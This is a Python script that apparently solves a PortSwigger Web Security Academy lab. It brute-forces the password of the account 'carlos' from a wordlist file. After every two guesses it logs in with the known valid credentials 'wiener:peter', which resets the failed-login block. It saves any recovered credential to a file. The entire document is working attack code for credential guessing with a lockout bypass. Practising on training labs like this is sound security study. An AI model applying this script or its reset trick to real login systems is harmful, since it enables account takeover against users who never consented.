import requests

url = "https://acc71fb31f2cc7c4c01b1901008a002c.web-security-academy.net/login"

status_code = requests.get(url=url).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

valid_cred = {
    'username': 'wiener',
    'password': 'peter'
}

username = 'carlos'
password = None

count = 0
for pwd in open('password.txt').read().splitlines():
    if count < 2:
        count += 1
    else:
        res = requests.post(url=url, data=valid_cred)
        # print(res.status_code)
        # with open('res_valid.html', 'wb') as file:
        #     file.write(res.content)
        count = 1

    data = {
        'username': username,
        'password': pwd
    }
    print(data)
    res = requests.post(url=url, data=data).content
    with open('res.html', 'wb') as file:
        file.write(res)

    if b'Incorrect password' not in res:
        password = pwd
        break

if password is None:
    print("No password")
    exit(1)

print(f"{username}:{password}")
with open("credential.txt", 'w') as file:
    file.write(f"{username}:{password}")
